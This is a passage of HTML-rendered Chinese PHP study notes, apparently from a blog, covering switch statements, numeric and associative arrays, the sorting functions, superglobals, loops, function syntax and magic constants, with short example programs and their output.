label2:</span><br><span class=\"line\"></span><br><span class=\"line\">    如果 n=label2，此处代码将执行;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"数组\">数组</h5>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP 数值数组</span><br><span class=\"line\">这里有两种创建数值数组的方法：</span><br><span class=\"line\">自动分配 ID 键（ID 键总是从 <span class=\"number\">0</span> 开始）：</span><br><span class=\"line\"><span class=\"variable\">$cars</span>=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;Volvo&quot;</span>,<span class=\"string\">&quot;BMW&quot;</span>,<span class=\"string\">&quot;Toyota&quot;</span>);</span><br><span class=\"line\">人工分配 ID 键：</span><br><span class=\"line\"><span class=\"variable\">$cars</span>[<span class=\"number\">0</span>]=<span class=\"string\">&quot;Volvo&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$cars</span>[<span class=\"number\">1</span>]=<span class=\"string\">&quot;BMW&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$cars</span>[<span class=\"number\">2</span>]=<span class=\"string\">&quot;Toyota&quot;</span>;</span><br><span class=\"line\">下面的实例创建一个名为 <span class=\"variable\">$cars</span> 的数值数组，并给数组分配三个元素,然后打印一段包含数组值的文本：</span><br><span class=\"line\">实例</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$cars</span>=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;Volvo&quot;</span>,<span class=\"string\">&quot;BMW&quot;</span>,<span class=\"string\">&quot;Toyota&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;I like &quot;</span> . <span class=\"variable\">$cars</span>[<span class=\"number\">0</span>] . <span class=\"string\">&quot;, &quot;</span> . <span class=\"variable\">$cars</span>[<span class=\"number\">1</span>] . <span class=\"string\">&quot; and &quot;</span> . <span class=\"variable\">$cars</span>[<span class=\"number\">2</span>] . <span class=\"string\">&quot;.&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">获取数组的长度 - <span class=\"title function_ invoke__\">count</span>() 函数</span><br><span class=\"line\"><span class=\"title function_ invoke__\">count</span>() 函数用于返回数组的长度（元素的数量）：</span><br><span class=\"line\">实例</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$cars</span>=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;Volvo&quot;</span>,<span class=\"string\">&quot;BMW&quot;</span>,<span class=\"string\">&quot;Toyota&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">count</span>(<span class=\"variable\">$cars</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">遍历数值数组</span><br><span class=\"line\">遍历并打印数值数组中的所有值，您可以使用 <span class=\"keyword\">for</span> 循环，如下所示：</span><br><span class=\"line\">实例</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$cars</span>=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;Volvo&quot;</span>,<span class=\"string\">&quot;BMW&quot;</span>,<span class=\"string\">&quot;Toyota&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$arrlength</span>=<span class=\"title function_ invoke__\">count</span>(<span class=\"variable\">$cars</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"variable\">$x</span>=<span class=\"number\">0</span>;<span class=\"variable\">$x</span>&lt;<span class=\"variable\">$arrlength</span>;<span class=\"variable\">$x</span>++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$cars</span>[<span class=\"variable\">$x</span>];</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">PHP 关联数组</span><br><span class=\"line\">关联数组是使用您分配给数组的指定的键的数组。</span><br><span class=\"line\">这里有两种创建关联数组的方法：</span><br><span class=\"line\"><span class=\"variable\">$age</span>=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;Peter&quot;</span>=&gt;<span class=\"string\">&quot;35&quot;</span>,<span class=\"string\">&quot;Ben&quot;</span>=&gt;<span class=\"string\">&quot;37&quot;</span>,<span class=\"string\">&quot;Joe&quot;</span>=&gt;<span class=\"string\">&quot;43&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">or</span>:</span><br><span class=\"line\"><span class=\"variable\">$age</span>[<span class=\"string\">&#x27;Peter&#x27;</span>]=<span class=\"string\">&quot;35&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$age</span>[<span class=\"string\">&#x27;Ben&#x27;</span>]=<span class=\"string\">&quot;37&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$age</span>[<span class=\"string\">&#x27;Joe&#x27;</span>]=<span class=\"string\">&quot;43&quot;</span>;</span><br><span class=\"line\">随后可以在脚本中使用指定的键：</span><br><span class=\"line\">实例</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$age</span>=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;Peter&quot;</span>=&gt;<span class=\"string\">&quot;35&quot;</span>,<span class=\"string\">&quot;Ben&quot;</span>=&gt;<span class=\"string\">&quot;37&quot;</span>,<span class=\"string\">&quot;Joe&quot;</span>=&gt;<span class=\"string\">&quot;43&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;Peter is &quot;</span> . <span class=\"variable\">$age</span>[<span class=\"string\">&#x27;Peter&#x27;</span>] . <span class=\"string\">&quot; years old.&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">遍历关联数组</span><br><span class=\"line\">遍历并打印关联数组中的所有值，您可以使用 <span class=\"keyword\">foreach</span> 循环，如下所示：</span><br><span class=\"line\">实例</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$age</span>=<span class=\"keyword\">array</span>(<span class=\"string\">&quot;Peter&quot;</span>=&gt;<span class=\"string\">&quot;35&quot;</span>,<span class=\"string\">&quot;Ben&quot;</span>=&gt;<span class=\"string\">&quot;37&quot;</span>,<span class=\"string\">&quot;Joe&quot;</span>=&gt;<span class=\"string\">&quot;43&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>(<span class=\"variable\">$age</span> <span class=\"keyword\">as</span> <span class=\"variable\">$x</span>=&gt;<span class=\"variable\">$x_value</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Key=&quot;</span> . <span class=\"variable\">$x</span> . <span class=\"string\">&quot;, Value=&quot;</span> . <span class=\"variable\">$x_value</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"数组排序\">数组排序</h5>\n<ul>\n<li>数组中的元素可以按字母或数字顺序进行降序或升序排列。</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP - 数组排序函数:</span><br><span class=\"line\"><span class=\"title function_ invoke__\">sort</span>() - 对数组进行升序排列</span><br><span class=\"line\"><span class=\"title function_ invoke__\">rsort</span>() - 对数组进行降序排列</span><br><span class=\"line\"><span class=\"title function_ invoke__\">asort</span>() - 根据关联数组的值，对数组进行升序排列</span><br><span class=\"line\"><span class=\"title function_ invoke__\">ksort</span>() - 根据关联数组的键，对数组进行升序排列</span><br><span class=\"line\"><span class=\"title function_ invoke__\">arsort</span>() - 根据关联数组的值，对数组进行降序排列</span><br><span class=\"line\"><span class=\"title function_ invoke__\">krsort</span>() - 根据关联数组的键，对数组进行降序排列</span><br></pre></td></tr></table></figure>\n<h5 id=\"超级全局变量\">超级全局变量</h5>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$GLOBALS</span></span><br><span class=\"line\"><span class=\"variable\">$_SERVER</span></span><br><span class=\"line\"><span class=\"variable\">$_REQUEST</span></span><br><span class=\"line\"><span class=\"variable\">$_POST</span></span><br><span class=\"line\"><span class=\"variable\">$_GET</span></span><br><span class=\"line\"><span class=\"variable\">$_FILES</span></span><br><span class=\"line\"><span class=\"variable\">$_ENV</span></span><br><span class=\"line\"><span class=\"variable\">$_COOKIE</span></span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"PHP-循环\">PHP 循环</h5>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> 循环：</span><br><span class=\"line\"><span class=\"keyword\">while</span> 循环将重复执行代码块，直到指定的条件不成立。</span><br><span class=\"line\">语法<span class=\"keyword\">while</span> (条件)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    要执行的代码;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">do</span>...<span class=\"keyword\">while</span> 语句：</span><br><span class=\"line\"><span class=\"keyword\">do</span>...<span class=\"keyword\">while</span> 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。</span><br><span class=\"line\"></span><br><span class=\"line\">语法</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    要执行的代码;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">while</span> (条件);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> 循环：</span><br><span class=\"line\"><span class=\"keyword\">for</span> 循环用于您预先知道脚本需要运行的次数的情况。</span><br><span class=\"line\"></span><br><span class=\"line\">语法</span><br><span class=\"line\"><span class=\"keyword\">for</span> (初始值; 条件; 增量)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    要执行的代码;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">参数：</span><br><span class=\"line\"></span><br><span class=\"line\">初始值：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。</span><br><span class=\"line\">条件：循环执行的限制条件。如果为 <span class=\"literal\">TRUE</span>，则循环继续。如果为 <span class=\"literal\">FALSE</span>，则循环结束。</span><br><span class=\"line\">增量：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。</span><br><span class=\"line\">注释：上面的初始值和增量参数可为空，或者有多个表达式（用逗号分隔）。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> 循环：</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> 循环用于遍历数组。</span><br><span class=\"line\"></span><br><span class=\"line\">语法</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"variable\">$array</span> <span class=\"keyword\">as</span> <span class=\"variable\">$value</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    要执行代码;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">每进行一次循环，当前数组元素的值就会被赋值给 <span class=\"variable\">$value</span> 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"variable\">$array</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    要执行代码;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">每一次循环，当前数组元素的键与值就都会被赋值给 <span class=\"variable\">$key</span> 和 <span class=\"variable\">$value</span> 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。</span><br></pre></td></tr></table></figure>\n<h5 id=\"PHP-函数\">PHP 函数</h5>\n<ul>\n<li>如要在页面加载时执行脚本，您可以把它放到函数里。</li>\n<li>函数是通过调用函数来执行的。</li>\n<li>你可以在页面的任何位置调用函数。</li>\n<li>PHP 函数准则：\n<ul>\n<li>函数的名称应该提示出它的功能</li>\n<li>函数名称以字母或下划线开头（不能以数字开头）</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">functionName</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"><span class=\"comment\">// 要执行的代码</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>函数（）里面可以传参数，($a,$ b); 如需让函数返回一个值，请在函数主体内使用 return 语句。</li>\n</ul>\n<h5 id=\"PHP-魔术常量\">PHP 魔术常量</h5>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">__LINE__</span></span><br><span class=\"line\">文件中的当前行号。</span><br><span class=\"line\"></span><br><span class=\"line\">实例</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&#x27;这是第 &quot; &#x27;</span>  . <span class=\"keyword\">__LINE__</span> . <span class=\"string\">&#x27; &quot; 行&#x27;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">以上实例输出结果为：</span><br><span class=\"line\"></span><br><span class=\"line\">这是第 “ <span class=\"number\">2</span> ” 行</span><br><span class=\"line\"><span class=\"keyword\">__FILE__</span></span><br><span class=\"line\">文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。</span><br><span class=\"line\"></span><br><span class=\"line\">自 PHP <span class=\"number\">4.0</span>.<span class=\"number\">2</span> 起，<span class=\"keyword\">__FILE__</span> 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。</span><br><span class=\"line\"></span><br><span class=\"line\">实例:</span><br><span class=\"line\"></span><br><span class=\"line\">实例</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&#x27;该文件位于 &quot; &#x27;</span>  . <span class=\"keyword\">__FILE__</span> . <span class=\"string\">&#x27; &quot; &#x27;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">以上实例输出结果为：</span><br><span class=\"line\"></span><br><span class=\"line\">该文件位于 “ E:\\wamp\\www\\test\\index.php ”</span><br><span class=\"line\"><span class=\"keyword\">__DIR__</span></span><br><span class=\"line\">文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。</span><br><span class=\"line\"></span><br><span class=\"line\">它等价于 <span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP <span class=\"number\">5.3</span>.<span class=\"number\">0</span>中新增）</span><br><span class=\"line\"></span><br><span class=\"line\">实例</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&#x27;该文件位于 &quot; &#x27;</span>  . <span class=\"keyword\">__DIR__</span> . <span class=\"string\">&#x27; &quot; &#x27;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">以上实例输出结果为：</span><br><span class=\"line\"></span><br><span class=\"line\">该文件位于 “ E:\\wamp\\www\\test ”</span><br><span class=\"line\"><span class=\"keyword\">__FUNCTION__</span></span><br><span class=\"line\">函数名称（PHP <span class=\"number\">4.3</span>.<span class=\"number\">0</span> 新加）。自 PHP <span class=\"number\">5</span> 起本常量返回该函数被定义时的名字（区分大小写）。在 PHP <span class=\"number\">4</span> 中该值总是小写字母的。</span><br><span class=\"line\"></span><br><span class=\"line\">实例</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span>  <span class=\"string\">&#x27;函数名为：&#x27;</span> . <span class=\"keyword\">__FUNCTION__</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">test</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">以上实例输出结果为：</span><br><span class=\"line\"></span><br><span class=\"line\">函数名为：test</span><br><span class=\"line\"><span class=\"keyword\">__CLASS__</span></span><br><span class=\"line\">类的名称（PHP <span class=\"number\">4.3</span>.<span class=\"number\">0</span> 新加）。自 PHP <span class=\"number\">5</span> 起本常量返回该类被定义时的名字（区分大小写）。</span><br><span class=\"line\"></span><br><span class=\"line\">在 PHP <span class=\"number\">4</span> 中该值总是小写字母的。类名包括其被声明的作用区域（例如 Foo\\Bar）。注意自 PHP <span class=\"number\">5.4</span> 起 <span class=\"keyword\">__CLASS__</span> 对 <span class=\"class\"><span class=\"keyword\">trait</span> 也起作用。当用在 <span class=\"title\">trait</span> 方法中时，<span class=\"title\">__CLASS__</span> 是调用 <span class=\"title\">trait</span> 方法的类的名字。</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\">实例</span></span><br><span class=\"line\"><span class=\"class\">&lt;?<span class=\"title\">php</span></span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_print</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;类名为：&#x27;</span>  . <span class=\"keyword\">__CLASS__</span> . <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span>  <span class=\"string\">&#x27;函数名为：&#x27;</span> . <span class=\"keyword\">__FUNCTION__</span> ;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$t</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">test</span>();</span><br><span class=\"line\"><span class=\"variable\">$t</span>-&gt;<span class=\"title function_ invoke__\">_print</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">以上实例输出结果为：</span><br><span class=\"line\"></span><br><span class=\"line\">类名为：test</span><br><span class=\"line\">函数名为：_print</span><br><span class=\"line\"><span class=\"keyword\">__TRAIT__</span></span><br><span class=\"line\">Trait 的名字（PHP <span class=\"number\">5.4</span>.<span class=\"number\">0</span> 新加）。自 PHP <span class=\"number\">5.4</span>.<span class=\"number\">0</span> 起，PHP 实现了代码复用的一个方法，称为 traits。</span><br><span class=\"line\"></span><br><span class=\"line\">Trait 名包括其被声明的作用区域（例如 Foo\\Bar）。</span><br><span class=\"line\"></span><br><span class=\"line\">从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖。其行为 MyHelloWorld 类中定义的方法一致。优先顺序是当前类中的方法会覆盖 <span class=\"class\"><span class=\"keyword\">trait</span> 方法，而 <span class=\"title\">trait</span> 方法又覆盖了基类中的方法。</span></span><br><span class=\"line\"><span class=\"class\"></span></span><br><span class=\"line\"><span class=\"class\">实例</span></span><br><span class=\"line\"><span class=\"class\">&lt;?<span class=\"title\">php</span></span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">class</span> <span class=\"title\">Base</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sayHello</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Hello &#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">trait</span> <span class=\"title\">SayWorld</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sayHello</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">parent</span>::<span class=\"title function_ invoke__\">sayHello</span>();</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;World!&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyHelloWorld</span> <span class=\"keyword\">extends</span> <span class=\"title\">Base</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">SayWorld</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"variable\">$o</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">MyHelloWorld</span>();</span><br><span class=\"line\"><span class=\"variable\">$o</span>-&gt;<span class=\"title function_ invoke__\">sayHello</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">以上例程会输出：</span><br><span class=\"line\"></span><br><span class=\"line\">Hello World!</span><br><span class=\"line\"><span class=\"keyword\">__METHOD__</span></span><br><span class=\"line\">类的方法名（PHP <span class=\"number\">5.0</span>.<span class=\"number\">0</span> 新加）。返回该方法被定义时的名字（区分大小写）。</span><br><span class=\"line\"></span><br><span class=\"line\">实例:</span><br><span class=\"line\"></span><br><span class=\"line\">实例</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span 